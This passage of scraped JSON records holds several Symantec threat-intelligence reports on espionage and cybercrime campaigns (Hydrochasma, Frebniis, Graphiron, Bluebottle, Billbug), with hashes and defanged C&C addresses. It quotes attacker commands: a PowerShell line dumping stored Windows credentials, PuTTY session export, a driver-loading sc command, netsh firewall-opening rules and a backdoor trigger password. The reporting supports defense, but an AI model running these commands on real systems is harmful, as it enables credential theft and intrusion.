8aa6612c95c7cef49709596da43a0f8354f14d8c08128c4cb9b1f37e548f083b – Backdoor.Atharvan 95f76a95adcfdd91cb626278006c164dcc46009f61f706426b135cdcfa9598e3 – Lilith 940ab006769745b19de5e927d344c4a4f29cae08e716ee0b77115f5f2a2e3328 – Lilith 38f0f2d658e09c57fc78698482f2f638843eb53412d860fb3a99bb6f51025b07 – Lilith c94c42177d4f9385b02684777a059660ea36ce6b070c2dba367bf8da484ee275 – Thumbsender f93ddb2377e02b0673aac6d540a558f9e47e611ab6e345a39fd9b1ba9f37cd22 – Custom Proxy Tool 3aae54592fe902be0ca1ab29afe5980be3f96888230d5842e93b3ca230f8d18d – Backdoor 0550e1731a6aa2546683617bd33311326e7b511a52968d24648ea231da55b7e5 – Backdoor 8023b2c1ad92e6c5fec308cfafae3710a5c47b1e3a732257b69c0acf37cb435b – Hacktool 1569074db4680a9da6687fb79d33160a72d1e20f605e661cc679eaa7ab96a2cd – Hacktool The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/clasiopa-materials-research"
  },
  {
    "title": "hydrochasma asia medical shipping intelligence gathering",
    "content": "Shipping companies and medical laboratories in Asia are being targeted in a likely intelligence-gathering campaign that relies exclusively on publicly available and living-off-the-land tools. Hydrochasma, the threat actor behind this campaign, has not been linked to any previously identified group, but appears to have a possible interest in industries that may be involved in COVID-19-related treatments or vaccines. This activity has been ongoing since at least October 2022. While Symantec, byBroadcom Software, did not see any data being exfiltrated in this campaign, the targets, as well as some of the tools used, indicate that the most likely motivation in this campaign is intelligence gathering. The infection vector used by Hydrochasma was most likely a phishing email. The first suspicious activity seen on machines is a lure document with a file name in the victim organization’s native language that appears to indicate it was an email attachment: [TRANSLATED FROM THE ORIGINAL] Product Specification-Freight-Company Qualification Information wps-pdf Export.pdf.exe Another lure document appears to be mimicking a resume: [TRANSLATED FROM THE ORIGINAL] [REDACTED] University-Development Engineer.exe Following initial access on one machine, the attackers were seen dropping Fast Reverse Proxy (FRP), a tool that can expose a local server that is sitting behind an NAT or firewall to the internet. This drops a legitimate Microsoft Edge update file: %TEMP%\\MicrosoftEdgeUpdate.exe Another file,%TEMP%\\msedgeupdate.dll, is then seen on victim machines. But this file is actually Meterpreter, a tool that is part of the Metasploit framework and which can be used for remote access. Other tools that were subsequently seen on this victim’s network included: A shellcode loader and a corrupted portable executable (PE) file were also deployed on this victim’s network. Other tactics, techniques, and procedures (TTPs) observed being used in this campaign included: The tools deployed by Hydrochasma indicate a desire to achieve persistent and stealthy access to victim machines, as well as an effort to escalate privileges and spread laterally across victim networks. While Symantec researchers didn’t observe data being exfiltrated from victim machines, some of the tools deployed by Hydrochasma do allow for remote access and could potentially be used to exfiltrate data. The sectors targeted also point towards the motivation behind this attack being intelligence gathering. The lack of custom malware used in this attack is also notable. Relying exclusively on living-off-the-land and publicly available tools can help make an attack stealthier, while also making attribution more difficult. Symantec did not see evidence to link this activity to a known actor, prompting us to create the new actor identity of Hydrochasma for those behind this activity. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 409f89f4a00e649ccd8ce1a4a08afe03cb5d1c623ab54a80874aebf09a9840e5 – Fast Reverse Proxy 47d328c308c710a7e84bbfb71aa09593e7a82b707fde0fb9356fb7124118dc88 – GoGo Scanning Tool 6698a81e993363fab0550855c339d9a20a25d159aaa9c4b91f60bb4a68627132 – Dropper 7229bd06cb2a4bbe157d72a3734ba25bc7c08d6644c3747cdc4bcc5776f4b5b9 – Process Dumper (lsass.exe) 72885373e3e8404f1889e479b3d46dd8111280379c4065bfc1e62df093e42aba – Fast Reverse Proxy 72bc8b30df3cdde6c58ef1e8a3eae9e7882d1abe0b7d4810270b5a0cc077bb1a – Cobalt Strike Beacon 7b410fa2a93ed04a4155df30ffde7d43131c724cdf60815ee354988b31e826f8 – Fast Reverse Proxy 7f0807d40e9417141bf274ef8467a240e20109a489524e62b090bccdb4998bc6 – Process Dumper (lsass.exe) 8c0f0d1acb04693a6bdd456a6fcd37243e502b21d17c8d9256940fc7943b1e9a – Cobalt Strike Beacon 8e32ea45e1139b459742e676b7b2499810c3716216ba2ec55b77c79495901043 – Fast Reverse Proxy 981e5f7219a2f92a908459529c42747ac5f5a820995f66234716c538b19993eb – GoGo Scanning Tool 9ebd789e8ca8b96ed55fc8e95c98a45a61baea3805fd440f50f2bde5ffd7a372 – Fast Reverse Proxy 9f5f7ba7d276f162cc32791bfbaa0199013290a8ac250eb95fd90bc004c3fd36 – Cobalt Strike Beacon a0f5966fcc64ce2d10f24e02ae96cdc91590452b9a96b3b1d4a2f66c722eec34 – AllIn Scanning Tool cb03b5d517090b20749905a330c55df9eb4d1c6b37b1b31fae1982e32fd10009 – Fscan d1c4968e7690fd40809491acc8787389de0b7cbc672c235639ae7b4d07d04dd4 – Shellcode Loader de01492b44372f2e4e38354845e7f86e0be5fb8f5051baafd004ec5c1567039f – Cobalt Strike Beacon e378d8b5a35d4ec75cae7524e64c1d605f1511f9630c671321ee46aa7c4d378b – PE File eba22f50eedfec960fac408d9e6add4b0bd91dd5294bee8cff730db53b822841 – Dropper fc4b5f2ee9da1fe105bb1b7768754d48f798bf181cbc53583387578a5ebc7b56 – Dogz Proxy Tool 02fe00ffd1b076983f3866c04ca95c56cef88c2564fabb586e11e54986e87ba7 084d1fc4236011d442801e423485c8e58f68dc14ec0a8b716fa0fd210de43dda 1744fac628262aa0cf3810bd5168375959be41764c8ca2fa41950a7b1f8f2fad 1d087f6a17227769bcebc799a2cdf1bb2a8fdf6ba560d21a88bb71f1c213a42c 327fc116f8f48f97292184bb50cb3db418f368b3e2a0fb41267ba40254a35a89 3516f94b0fb57e93c6659d813cbf5fb3617dea7a667c78cb70a1914306327906 41b6d26926706bb68530ddff234f69757e3bbef91c47eb0255313ed86cb3f806 44223e5abd106c077908f03c93b8c8baee7d630f1718f9750f16b786cf88fd06 553e0763cf3a938b5754c9d89939a118abe0b235e4be6920c34f562bd758e586 5a62abc0a2208679e414cc71d1f36ffa14b48df2b73ac520e45d557ad77dd004 6770f815480d7cfa0a6fc8599c08ca6013f608d257a2121233e77374e21c53f8 6cb815863088a0ad367b2a525a572323600596f6875a79536aee57202ef24fd5 6f017ad84d0d06f50b6213a0742838b5ec510f3d06f96e0300048f2da6a35c41 7394ab0ed6d1f62e83fc5f8f1eb720ddd07cbd2bcdf6a00b9b63ef6018fa5f90 7800a4fb0cbdf29815c521ea8b00a23e28d7eb365653f2afcfb5572622727218 7f6a1d6950a9464f27d8651a267563d4630d223bf7ac66851917a57f8fac6550 84502fbe3e5172c39e9a97734e6caac79255abffcb55c22752620d908ff33940 916b63b88de2549c4a5c8e13d51df4cf6996067ae30f24c8bb35c66db7c061df 968b28f7d6abb845f2cc7efa93cdcf7660585e22d589267695726de13afea260 9e8b5a84ad108a761619ca040788dcbf07996a9101cecc5c30ba61f9a06945c1 b53d0a43ea91b3c80bc6c87c0c6946816c38876b2cb2f6f772afe94c54d3ad30 b5c4f420067499522b748a34161ad6e140a7f30ab0b8fa63feef760c5e631679 d0ae66022929c17f31ddf98d88817f0aa70a56ce2ff2df9595b8889c2d3d7e31 d92c50a91bd5b2f06f41a9a5f9937e50b78658d46e3cd04bc3a85f270ce288c2 dc3b714fd6f93c0c0cd2685b6b8cd551896855474bdd09593b8c6b4b7ab6bac2 e7684a4984d9d82115c5cc1b43b9f63a11e7ed333a4e2d92dc15b6e931634bf4 ebc3dabf0a2dafb0790be6dbb4d3509b5ce1259b955172910618a32627b3b668 ee9aefde33ed48d16ecb1c41256fc7d93ddfa8bedfa59b95e8810282ac164d0d f35b206fe10ad3f57d9c4ecf71a2d2cc06d7c7fe905e567b989f72f147da99dc f73738e6e33286657cda81f618a74b74745590915a8f4451e7c00473cbe89e1d fc8a67b80b0b0ecd10dfd90820ffc64923b94c32b04dbb6929a79b9ce027563c ffdcf74968805e9cc897ca932e4da0f22ea7b3e9b96fcc9082c0c5300ae4cb0d 39.101.194[.]61 – Cobalt Strike Beacon C&C 47.92.138[.]241 – Cobalt Strike Beacon C&C alidocs.dingtalk[.]com.wswebpic[.]com – Cobalt Strike Beacon C&C csc.zte[.]com.cn.wswebpic[.]com – Cobalt Strike Beacon C&C taoche[.]cn.wswebpic[.]com – Cobalt Strike Beacon C&C hxxp://47.92.138[.]241:8090/update.exe hxxp://47.92.138[.]241:8000/agent.exe hxxp://47.92.138[.]241:8000/update.exe hxxp://47.92.138[.]241:8000/ff.exe hxxp://47.92.138[.]241:8000/aa.exe hxxp://47.92.138[.]241:8000/runas.exe hxxp://47.92.138[.]241:8090/a.exe hxxp://47.92.138[.]241:8000/t.exe hxxp://47.92.138[.]241:8000/po.exe hxxp://47.92.138[.]241:8080/t.exe hxxp://47.92.138[.]241:8899/t.exe hxxp://47.92.138[.]241:8000/logo.png hxxp://47.92.138[.]241:8080/t.png hxxp://47.92.138[.]241:8000/frp.exe The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/hydrochasma-asia-medical-shipping-intelligence-gathering"
  },
  {
    "title": "frebniis malware iis",
    "content": "Symantec, byBroadcom Software, has observed a new malware that abuses a feature of Microsoft’s Internet Information Services (IIS) to deploy a backdoor onto targeted systems. The malware, dubbed Frebniis (Backdoor.Frebniis), was used by a currently unknown threat actor against targets in Taiwan. The technique used by Frebniis involves injecting malicious code into the memory of a DLL file (iisfreb.dll) related to an IIS feature used to troubleshoot and analyze failed web page requests. This allows the malware to stealthily monitor all HTTP requests and recognize specially formatted HTTP requests sent by the attacker, allowing for remote code execution. In order to use this technique, an attacker needs to gain access to the Windows system running the IIS server by some other means. In this particular case, it is unclear how this access was achieved. IIS is a general-purpose web server that runs on Windows systems to serve requested HTML pages or files. An IIS web server accepts requests from remote client computers and returns the appropriate response. IIS has a feature known as Failed Request Event Buffering (FREB) that collects data and details about requests, such as originating IP address and port, HTTP headers with cookies, etc. A feature called Failed Request Tracing can be used to troubleshoot IIS failed requests. Failed Request Tracing buffers the trace events for a request and flushes them to disk if the request meets the definition of “fail” set by the user. Failed request tracing can, for example, be used to learn why requests are returning a specific HTTP status code (401 or 404, etc.), or why a request is taking too long to process, or is not responding. Frebniis ensures Failed Request Tracing is enabled and then accesses w3wp.exe (IIS) process memory, obtaining the address of where the Failed Request Event Buffering code (iisfreb.dll) is loaded.  With this code start address, Frebniis searches from there for a function pointer table to hijack code execution. The authors of Frebniis have determined that a particular function pointer within iisfreb.dll is called by iiscore.dll whenever any HTTP request is made to IIS from a web client. This function normally checks if the content of the HTTP request matches the Failed Request Tracing rules. Frebniis hijacks this function by injecting its own malicious code into IIS process memory and then replacing this function pointer with the address of its own malicious code. This hijack point allows Frebniis to stealthily receive and inspect every HTTP request to the IIS server before returning to the original function. The Frebniis malicious injected code parses all received HTTP POST requests for /logon.aspx or /default.aspx along with a parameter password set to ‘7ux4398!’. If the password matches, Frebniis decrypts and executes a section of the injected code, which is .NET executable code consisting of the main backdoor functionality. No executables are saved to disk in this process, keeping the backdoor completely stealthy. The .NET code provides proxying functionality and remote code execution controlled by a provided second HTTP parameter that is a Base64 encoded string. To enable the proxy, the encoded string is Base64 decoded and then decrypted (xor 0x08), with the first character representing a proxy command followed by expected parameters. The proxy is used to send and receive Base64 encoded data from other computer systems. This allows the attackers to communicate with internal resources that may normally be blocked from the internet via the compromised IIS server. The .NET backdoor code also supports remote execution. If an HTTP call to logon.aspx or default.aspx is received without the password parameter, but with the Base64 string, the Base64 string is assumed to be C# code that will be executed straight in memory. The Base64 string is decoded and then decrypted (xor 0x08) and is expected to be an XML document with the C# code to be executed in the ‘/doc’ node under the ‘data’ attribute (E.g. <doc data=C# code>).  The C# code is extracted and executed. This allows Frebniis to stealthily execute arbitrary code on the system. By hijacking and modifying IIS web server code, Frebniis is able to intercept the regular flow of HTTP request handling and look for specially formatted HTTP requests. These requests allow remote code execution and proxying to internal systems in a stealthy manner. No files or suspicious processes will be running on the system, making Frebniis a relatively unique and rare type of HTTP backdoor seen in the wild. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 6464f9a5da26aa53fb2221255e908fd4da8edf0633f94051beee74a14b9b001c – Backdoor.Frebniis b81c177c440e84635f22dc97b0411de93a24a983a41af676ffbbb4439487aaef – Backdoor.Frebniis The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/frebniis-malware-iis"
  },
  {
    "title": "nodaria ukraine infostealer",
    "content": "The Nodaria espionage group (aka UAC-0056) is using a new piece of information stealing malware against targets in Ukraine. The malware (Infostealer.Graphiron) is written in Go and is designed to harvest a wide range of information from the infected computer, including system information, credentials, screenshots, and files. The earliest evidence of Graphiron dates from October 2022. It continued to be used until at least mid-January 2023 and it is reasonable to assume that it remains part of the Nodaria toolkit. Graphiron is a two-stage threat consisting of a downloader (Downloader.Graphiron) and a payload (Infostealer.Graphiron). The downloader contains hardcoded command-and-control (C&C) server addresses. When executed, it will check against a blacklist of malware analysis tools by checking for running processes with the names listed in Table 1. If no blacklisted processes are found, it will connect to a C&C server and download and decrypt the payload before adding it to autorun. The downloader is configured to run just once. If it fails to download and install the payload it won’t make further attempts nor send a heartbeat. Graphiron uses AES encryption with hardcoded keys. It creates temporary files with the \".lock\" and \".trash\" extensions. It uses hardcoded file names designed to masquerade as Microsoft office executables: OfficeTemplate.exe and MicrosoftOfficeDashboard.exe The payload is capable of carrying out the following tasks: Password theft is carried out using the following PowerShell command: [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$vault = New-Object Windows.Security.Credentials.PasswordVault;$vault.RetrieveAll() | % { $_.RetrievePassw ord();$_} | Select UserName, Resource, Password | Format-Table –HideTableHeaders The following command was used to export the list of PuTTY sessions: \"CSIDL_SYSTEM\\reg.exe\" query HKCU\\Software\\SimonTatham\\Putty\\Sessions Graphiron has some similarities with older Nodaria tools such as GraphSteel and GrimPlant,which were first discovered by CERT-UA. GraphSteel is designed to exfiltrate files along with system information and credentials stolen from the password vault using PowerShell. Graphiron has similar functionality but can exfiltrate much more, such as screenshots and SSH keys. In addition to this, as with earlier malware, Graphiron communicates with the C&C server using port 443 and communications are encrypted using the AES cipher. Nodaria has been active since at least March 2021 and appears to be mainly involved in targeting organizations in Ukraine. There is also limited evidence to suggest that the group has been involved in attacks on targets in Kyrgyzstan. Third-party reporting has also linked the group to attacks on Georgia. The group sprang to public attention when it was linked to the WhisperGate wiper attacks that hit multiple Ukrainian government computers and websites in January 2022. When WhisperGate was initially loaded onto a system, the malware would overwrite the portion of the hard drive responsible for launching the operating system when the machine is booted up with a ransom note demanding $10,000 in Bitcoin. However, this was just a decoy as the WhisperGate malware destroys data on an infected machine and it cannot be recovered, even if a ransom is paid. The group’s usual infection vector is spear-phishing emails, which are then used to deliver a range of payloads to targets. Custom tools used by the group to date include: Like Graphiron, many of Nodaria’s earlier tools were written in Go. Graphiron appears to be the latest piece of malware authored by the same developers, likely in response to a need for additional functionality. While GraphSteel and GrimPlant used Go version 1.16, Graphiron uses version 1.18, confirming it is a more recent development. While Nodaria was relatively unknown prior to the Russian invasion of Ukraine, the group’s high-level activity over the past year suggests that it is now one of the key players in Russia’s ongoing cyber campaigns against Ukraine. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 0d0a675516f1ff9247f74df31e90f06b0fea160953e5e3bada5d1c8304cfbe63 — Downloader.Graphiron 878450da2e44f5c89ce1af91479b9a9491fe45211fee312354dfe69e967622db — Downloader.Graphiron 80e6a9079deffd6837363709f230f6ab3b2fe80af5ad30e46f6470a0c73e75a7 — Infostealer.Graphiron eee1d29a425231d981efbc25b6d87fdb9ca9c0e4e3eb393472d5967f7649a1e6 — Infostealer.Graphiron f0fd55b743a2e8f995820884e6e684f1150e7a6369712afe9edb57ffd09ad4c1 — Infostealer.Graphiron f86db0c0880bb81dbfe5ea0b087c2d17fab7b8eefb6841d15916ae9442dd0cce — Infostealer.Graphiron 208.67.104[.]95 — C&C server The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/nodaria-ukraine-infostealer"
  },
  {
    "title": "bluebottle banks targeted africa",
    "content": "Bluebottle, a cyber-crime group that specializes in targeted attacks against the financial sector, is continuing to mount attacks on banks in Francophone countries. The group makes extensive use of living off the land, dual-use tools, and commodity malware, with no custom malware deployed in this campaign. The activity observed by Symantec, a division ofBroadcom Software, appears to be a continuation of activity documented in aGroup-IB report from November 2022. The activity documented by Group-IB spanned from mid-2019 to 2021, and it said that during that period this group, which it called OPERA1ER, stole at least $11 million in the course of 30 targeted attacks. Similarities in the tactics, techniques, and procedures (TTPs) between the activity documented by Group-IB and the activity seen by Symantec include: While this does appear to be a continuation of the activity documented by Group-IB, the activity seen by Symantec is more recent, running from at least July 2022 to September 2022, though some of the activity may have begun as far back as May 2022. Some new TTPs have also been employed in recent attacks, including: The initial infection vector is unknown, but the earliest malicious files found on victim networks had French-language, job-themed file names. These likely acted as lures. In some cases, the malware was named to trick the user into thinking it was a PDF file, e.g.: It’s most likely these files were delivered to victims via a spear-phishing email, which would align with the initial infection vector documented by Group-IB for the OPERA1ER activity. Although the majority of the activity observed by Symantec researchers began in July 2022, at least one victim was found to have an infostealer with a similar naming theme on its network as early as mid-May 2022. In that case, the malware arrived in the form of a ZIP file containing an executable SCR file. The file is an older, likely commodity, malware. It's difficult to determine when it was used to target the organization. It is, however, consistent with infection vectors reported as used by OPERA1ER in 2021. However, the job-themed malware in July was observed in paths suggesting it had been mounted as CD-ROMs. This could indicate a genuine disc was inserted, but it could also be that a malicious ISO file was delivered to victims and mounted. An ISO file is an archive file that contains an identical copy or image of the data that would be found on an optical disc. Malicious ISO files have been used as an initial infection vector in other campaigns in 2022, including being used alongside theBumblebee loader in a campaign where delivering ransomware was the ultimate goal. If the Bluebottle and OPERA1ER actors are indeed one and the same, this would mean that they swapped out their infection techniques between May and July 2022. ISO files were not seen in the activity documented by Group-IB. In many cases, the job-themed malware delivered to victims was the commodity loader called GuLoader. GuLoader is a shellcode-based downloader with anti-analysis features. In addition to malicious files, the loader deploys some legitimate binaries as a decoy for its malicious activity. GuLoader was distributed to victims in a self-extracting NSIS executable. This NSIS script decrypts and injects obfuscated shellcode into another process. The process most often observed in the July activity wasieinstal.exe, the Internet Explorer Add-on Installer, but also includedaspnet_regbrowsers.exe, the ASP.NET Browser Registration tool. The process for the Internet Explorer Add-on Installer was likely used to download a malicious .NET downloader from URLs such ashxxp://178.73.192[.]15/ca1.exe. Multiple .NET downloaders were found that abused the file transfer servicetransfer[.]shto download a file named with an RTF extension. This payload is unknown, but the downloaders are designed to load it as a .NET DLL. After GuLoader and the .NET loaders were deployed, various other post-compromise tools were seen on victim networks. These include the publicly available Netwire remote access Trojan (RAT) and the open-source Quasar RAT. The attackers also used the commercial post-compromise tool Cobalt Strike Beacon. The Cobalt Strike Beacon variant used by Bluebottle employed an API hammering technique in order to hamper analysis. A set of malware was also deployed by the attackers that had the likely goal of disabling the security products on victim networks. The malware consisted of two components, a controlling DLL that reads a list of processes from a third file, and a signed 'helper' driver controlled by the first driver and used to terminate the processes in the list. Attackers used Windows Service Control (sc.exe) to load the driver: sc create fgt binPath= %TEMP%\\fgt.sys type= kernel In August 2022, Symantec observed the same driver being used in suspected pre-ransomware attack activity against a non-profit in Canada. Another tool found on the victim network was Infostealer.Eamfo,a hacktool that has been associated with Cuba, Noberus, and Lockbit ransomware attacks. The same driver also appears to have been used by multiple groups for similar purposes.Mandiant documented a financially motivated threat groupit calls UNC3944 using this same driver to disable defenses. It referred to this driver as POORTRY and the malware that uses it as STONESTOP. However, Mandiant did note at the time that “POORTRY appears across different threat groups and is consistent with malware available for purchase or shared freely between different groups.” Sophos also documented an instance where Cuba ransomware operatorsused a loader called BURNTCIGAR to load signed driversto kill defenses. The loader operates similarly to the malicious DLL seen in this activity. These drivers were reported to Microsoft by other vendors, and the company suspended the developer accounts andadded defenses to address them. The short-term goal of Bluebottle in this recent activity appears in part to be persistence and credential theft. The actors used credential theft techniques and tools, such as modifying the WDigest setting and deploying Mimikatz, as well as an open-source fake login screen keylogger. For lateral movement, the attackers deployed the penetration testing tool SharpHound for domain trust enumeration and executed additional files across the victim organizations using PsExec. For persistence, evidence suggests the attackers added additional accounts using the'net localgroup /add'command. They also deployed an open-source RDPWrap script to enable multiple concurrent RDP sessions on victim systems. This script also modifies the registry and opens port 3389 on the firewall to allow RDP traffic through. Indications are that this activity was likely “hands-on-keyboard” activity rather than automated. While we do not see what further activity is carried out by the attackers, the victims and the crossover with the activity documented by Group-IB all indicate that this activity is likely financially motivated. Three different financial institutions in three African nations were compromised in the activity seen by Symantec, with multiple machines infected in all three organizations. The activity on one of the infected institution’s networks ran as follows: The first activity was seen in mid-July 2022, when job-themed malware was spotted on the infected system. A downloader was then deployed, before the Sharphound hacktool was detected and a tool called fakelogonscreen was also deployed. About three weeks after the initial compromise of the network, the attackers were seen using a command prompt and PsExec for lateral movement. It appears the attackers were “hands on keyboard” at this point of the attack. The attackers used various dual-use and living-off-the-land tools for numerous purposes, including: Malicious tools used included: Multiple other unknown files were also deployed on this network. The last activity seen on this network was in September 2022, but the Ngrok tunneling tool remained on the network until November 2022. Some of the same tools were also deployed on the other victims, with GuLoader seen in all three victims. Other activity linking the activity in all three victims includes: While Symantec cannot confirm whether or not Bluebottle successfully monetized the campaigns we saw it carrying out, the group’s success at monetizing its activity between 2019 and 2021, as documented by Group-IB, indicates that this group has had a significant amount of success in the past. The effectiveness of its campaigns means that Bluebottle is unlikely to stop this activity. It appears to be very focused on Francophone countries in Africa, so financial institutions in these countries should remain on high alert for the activity documented in this blog. The attackers appear to be French-speaking, so the possibility of them expanding this activity to French-speaking nations in other regions also cannot be ruled out. For the latest protection updates, please visit theSymantec Protection Bulletin. 117c66c0aa3f7a5208b3872806d481fd8d682950573c2a7acaf7c7c7945fe10d — ZIP file c56c915cd0bc528bdb21d6037917d2e4cde18b2ef27a4b74a0420a5f205869e6 —  Infostealer 91b3546dde60776ae3ed84fdf4f6b5fba7d39620f0a6307280265cde3a33206b — .NET downloader 9c4c9fa4d8935df811cae0ce067de54ffdb5cfb4f99b4bc36c5aa2a1ac6f9c8f — .NET downloader 1f6be4c29dfb50f924377444e5ca579d3020985a357533fc052226f0091febf6 — .NET downloader d5b8009dcb50aac8a889e24f038a52fe09721d142a3f1eaa74ac37fff45e9ba2 — .NET downloader ae4ff662c959cf24df621a2c0b934ed1fa1c26a270a180f695cd5295579afbbd — .NET downloader 0612ef9d2239edeab05f421e3188e2cfcadacbaeafbc9b8e35e778f7234aaa3b — .NET downloader 4acd4335ca43783ff52c0ccbb7e757ea14fb261c33d08268e85ed0ac34e0abec — .NET downloader 47718762dc043f84fb641b1e0a8c65401160cc2e558fd38c14d5d35a114b93cb — .NET downloader a539961f80feb689546a2e334b03aed81252a04fae032e2d28ed9a7000b3afff — .NET downloader 07ca6122fde46d48f71bcde356d5eeb89040e4a6e83441968a9dade98dc36fe5 — .NET loader 938f50cb2e2d670497209e8cef5bf1042f752b6bf76d1547d68040b5a27f618b — .NET loader a257eeebba15afecf76b89a379e066e5ed79a2bb9da349c1fdb5a24316abc753 —  GuLoader f276c6a25d6b865c6202978f1d409e8b74e063263eab517f249cf6d3ad3fae4a — GuLoader 3d0fd0444a9e295135ecfdc8c87ddc6dcdff63969c745e0218469332aef18dfe — GuLoader ac98e6bf6d16904355b1c706bc2b79761a8b09044da40f2c8bce35142ef8bcc8 — GuLoader ca75b0864d8308efe94eb0822de55eb7f5cfd482d2190100dfd00d433ee790a0 — GuLoader 088110b0ee3588a4822049cf60fff31c67323a9b5993eae3104cc9737a47ce0c — GuLoader b4adbb5d017d6452c2e1700584261cd3170ee5a14ac658424945f15177494ba1 — GuLoader 818284e7ea0a4bd64ba0eda664f51877ed8c6d35bf052898559dbf4ad8030968 — GuLoader fa6ca0a168f3400a00dc43f1be07296f4111d7ad9b275809217a9269dd613ae8 — GuLoader d5b3b1304739986298ba9b7c3ff8b40b3740233d6bb02437ce61a20ee87468bc — GuLoader 8495a328fdd4afd33c3336e964802018d44c1dda15b804560743d6276e926218 — GuLoader ce2ea1807d984e1392599d05f7ab742bae4f20f8ef80c5a514fbdeede2ff7e55 — Quasar RAT e933ec0f52cbc60b92134d48b08661b1af25c7d93ff5041fc704559b45bd85b8 — Netwire RAT 6db5e2bb146b11182f29d03b036af4e195044f0ef7a8f7c4429f5d4201756b8f — Cobalt Strike f4fba2181668f766fdfbd1362420a53ac0b987f999c95baf5dbe235fd3bad4b8 — Cobalt Strike ec2146655e2c04bf87b8db754dd2e92b8c48c4df47b64a9adc1252efd8618e62 — Fakelogonscreen e5633d656dea530a62f5ad2792f253e74453712be34d2eadfb49190f7a9ee10b — Malicious DLL used to register Helper Driver 0440ef40c46fdd2b5d86e7feef8577a8591de862cfd7928cdbcc8f47b8fa3ffc — Signed Helper driver 5090f311b37309767fb41fa9839d2770ab382326f38bab8c976b83ec727e6796 — Sharphound 5e245281f4924c139dd90c581fc79105ea19980baa68eeccf5bf36ae613399b9 — PsExec 31eb1de7e840a342fd468e558e5ab627bcb4c542a8fe01aec4d5ba01d539a0fc — Mimikatz hxxp://files[.]ddrive[.]online:444/load hxxp://85.239.34[.]152/download/XWO_UnBkJ213.bin hxxps://transmissive-basin[.]000webhostapp[.]com hxxps://udapte[.]adesy[.]in banqueislamik[.]ddrive[.]online hxxps://transfer[.]sh/get/mKwvWI/NHmZJu.rtf hxxps://transfer[.]sh/get/RTPlqa/oISxUP.rtf hxxp://files[.]ddrive[.]online:4448/a hxxp://banqueislamik[.]ddrive[.]online:4448/ZPjH hxxp://46.246.86[.]12/ca3.exe hxxp://178.73.192[.]15/ca1.exe personnel[.]bdm-sa[.]fr The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/bluebottle-banks-targeted-africa"
  },
  {
    "title": "espionage asia governments cert authority",
    "content": "State-sponsored actors compromised a digital certificate authority in an Asian country during a campaign in which multiple government agencies were also targeted. Symantec, byBroadcom Software, was able to link this activity to a group we track as Billbug due to the use in this campaign of tools previously attributed to this group. Billbug (aka Lotus Blossom, Thrip) is a long-established advanced persistent threat (APT) group that is believed to have been active since at least 2009. Symantec has previously published on thisgroup’s activity in 2018and 2019 under the Thrip name, but followingour 2019 investigation, we determined that Thrip and Billbug were most likely the same group so now track all activity under the Billbug name. In activity documented by Symantec in 2019, we detailed how the group was using a backdoor known as Hannotog (Backdoor.Hannotog) and another backdoor known as Sagerunex (Backdoor.Sagerunex). Both these tools were also seen in this more recent activity. The victims in this campaign included a certificate authority, as well as government and defense agencies. All the victims were based in various countries in Asia. Billbug is known to focus on targets in Asian countries. In at least one of the government victims, a large number of machines on the network were compromised by the attackers. The targeting of a certificate authority is notable, as if the attackers were able to successfully compromise it to access certificates they could potentially use them to sign malware with a valid certificate, and help it avoid detection on victim machines. It could also potentially use compromised certificates to intercept HTTPS traffic. However, although this is a possible motivation for targeting a certificate authority, Symantec has seen no evidence to suggest they were successful in compromising digital certificates. Symantec has notified the cert authority in question to inform them of this activity. This activity has been ongoing since at least March 2022. There are some indications that the attackers are exploiting public-facing applications to gain initial access to victim networks. The attackers use multiple dual-use tools in this attack campaign, as well as custom malware. Billbug’s extensive use of dual-use and living-off-the-land tools was also notable in its previous campaigns. Among the dual-use tools leveraged in this recent activity are: Multiple files that are believed to be loaders for the Hannotog backdoor were spotted on victim machines. A backdoor was then deployed on the compromised system. This backdoor has multiple functionalities: netsh advfirewall firewall add rule name=\"Core Networking - Router Solicitation (ICMP-In)\" dir=in action=allow program=\"%s\" enable=yesnetsh firewall add portopening UDP 5900 @xpsp2res.dll,-22006 ENABLE ALL',0netsh firewall add allowedprogram name=\"SNMP Trap Service\" program=\"%s\" mode=enable A tool called Stowaway Proxy Tool was also downloaded to victim machines. Stowaway is a multi-level proxy tool written in the Go language and intended for use by penetration testers. Users can use this program to proxy external traffic to the intranet through multiple nodes, break through intranet access restrictions, construct a tree-like node network, and easily implement management functions. It is not unusual to see penetration testing tools misused by threat actors. Cobalt Strike, which is a penetration testing framework, is considered commodity malware by many due to how often it is used by malicious actors. The Sagerunex backdoor is fairly resilient and implements multiple forms of communication with its command-and-control (C&C) server. The analyzed sample had no hardcoded configuration, so it had to be dropped on the machine by a loader malware, such as Hannotog. In the sample analyzed by Symantec, configuration is passed to the sample via a parameter of the exported function (called MainEntry). That configuration is decrypted with a simple XOR operation: return xor(x, b\"\\xad\" + x[:-1]) Next, the sample finds the explorer.exe process and uses it to change the token of the current thread. It then writes logs to a temporary file (%TEMP%/TS_FB56.tmp), but only if the file already exists. These logs are encrypted and the encryption algorithm used is AES256-CBC with 8192 rounds of SHA256: def decrypt(datasample): key = 